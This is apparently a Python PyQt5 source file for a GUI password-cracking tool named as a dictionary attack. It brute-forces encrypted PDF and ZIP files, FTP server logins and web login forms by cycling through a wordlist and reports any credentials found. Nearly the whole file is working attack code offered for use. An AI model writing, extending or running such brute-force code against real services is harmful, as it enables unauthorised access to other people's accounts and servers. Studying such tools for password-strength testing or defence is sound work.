from PyQt5 import QtWidgets, uic
import sys
import PyPDF2 as pd
from zipfile import ZipFile
import ftplib, sys, getopt, threading
import requests

incorrectMessage = ['error', 'required']
successMessage = ['success', 'SUCCESS']
LIMIT_TRYING_ACCESSING_URL = 5


def openRessources(filePath):
    array_ = open(filePath).readlines()
    array_ = [item.replace("\n", "") for item in array_]
    return array_


def ftpLog(username, password, ftpurl, port):
    try:    
        serv = ftplib.FTP()
        serv.connect(ftpurl, port, timeout=30)    # set timeout to wait for unresponsive connection
        # print ("Checking: " + username + ', ' +  password)
        print('Trying password: {}'.format(password))
        win.output.append('Trying password: {}'.format(password))
        serv.login(username, password)
        print ("Credentials Found: " +  username +', ' + password)
        win.output.append('Credentials Found: ' +  username +', ' + password)
        serv.quit()
        return 1
    except:
        return 0

def CrackPDF(filePath):
    win.output.clear()
    # filePath = win.filepath.text()
    file = open(filePath, 'rb')
    pdfReader = pd.PdfFileReader(file)
    
    if not pdfReader.isEncrypted:
        print('The file is not encryted! You can successfully open it!')
        win.output.append('The file is not encryted! You can successfully open it!')
    
    else:
        # wordListFile = open('dictionary.txt', 'r')
        # body = wordListFile.read().lower()
        # words = body.split('\n')
        words = openRessources('dictionary.txt')

        for i in range(len(words)):
            word = words[i]
            print('Trying dencryption by: {}'.format(word))
            win.output.append('Trying dencryption by: {}'.format(word))
            result = pdfReader.decrypt(word)
            if result == 1:
                print('Success! The password is: ' + word)
                win.output.append('Success! The password is: ' + word)
                break

            elif result == 0:
                # tried += 1
                # print('Passwords tried: ' + str(tried))
                continue

def CrackZip(filePath):
    # filePath = win.filepath.text()
    file_to_open = ZipFile(filePath) 
    try:
        if file_to_open.testzip() == None:
            print('The file is not encryted! You can successfully open it!')
            win.output.append('The file is not encryted! You can successfully open it!')
    except RuntimeError:
        pass

    words = openRessources('dictionary.txt')
    for i in range(len(words)):
            word = words[i] 
            try: 
                print('Trying dencryption by: {}'.format(word))
                win.output.append('Trying dencryption by: {}'.format(word))
                file_to_open.extractall(pwd=word.encode()) 
                print('Success! The password is: ' + word)
                win.output.append('Success! The password is: ' + word)
                break
            except: 
                pass 

def FileCrack():
    filePath = win.filepath.text()
    if filePath.endswith('.pdf'):
        CrackPDF(filePath)
    else :
        CrackZip(filePath)


def FTPCrack():
    ftpurl = win.ftpurl.text()
    port = int(win.port.text())
    ftpusername = win.ftpusername.text()

    passwords = openRessources('dictionary.txt')
    for password in passwords:
            result = ftpLog(ftpusername, password, ftpurl, port)
            if result == 1:
                break

def LoginCrack():
    posturl = win.posturl.text()
    userField = win.userField.text()
    passField = win.passField.text()
    loginusername = win.loginusername.text()
    passwords = openRessources('dictionary.txt')
    failed_aftertry = 0
    for password in passwords:
        dados = {userField: loginusername.replace('\n', ''),
                 passField: password.replace('\n', '')}
        # print ("[+]", dados)
        # Doing the post form
        response = requests.post(posturl, data=dados)
        #print data.text
        if "404" in response.text or "404 - Not Found" in response.text or response.status_code == 404:
            if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
                print ("Connexion failed : Trying again ....")
                win.output.append("Connexion failed : Trying again ....")
                break
            else:
                failed_aftertry = failed_aftertry+1
                print ("Connexion failed : 404 Not Found (Verify your url)")
                win.output.append("Connexion failed : 404 Not Found (Verify your url)")
        else:
            # if you want to see the text result decomment this
            #print data.text
            if incorrectMessage[0] in response.text or incorrectMessage[1] in response.text:
                print ("Failed to connect with:\n user: "+ loginusername +" and password: "+password)
                win.output.append("Failed to connect with:\n user: "+ loginusername +" and password: "+password)
            else:
                if successMessage[0] in response.text or successMessage[1] in response.text:
                    result = "\nYes!! \nTheese Credentials succeed:\n> user: "+ loginusername+" and password: " + password
                    print(result)
                    win.output.append(result)
                    break
                else:
                    print ("Trying theese parameters: user: "+ loginusername+" and password: "+password)
                    win.output.append("Trying theese parameters: user: "+loginusername+" and password: "+password)



app = QtWidgets.QApplication([])
 
win = uic.loadUi("dictionary_attack.ui") #specify the location of your .ui file
win.fileCrack.clicked.connect(FileCrack)
win.ftpCrack.clicked.connect(FTPCrack)
win.loginCrack.clicked.connect(LoginCrack)

win.show() 
sys.exit(app.exec())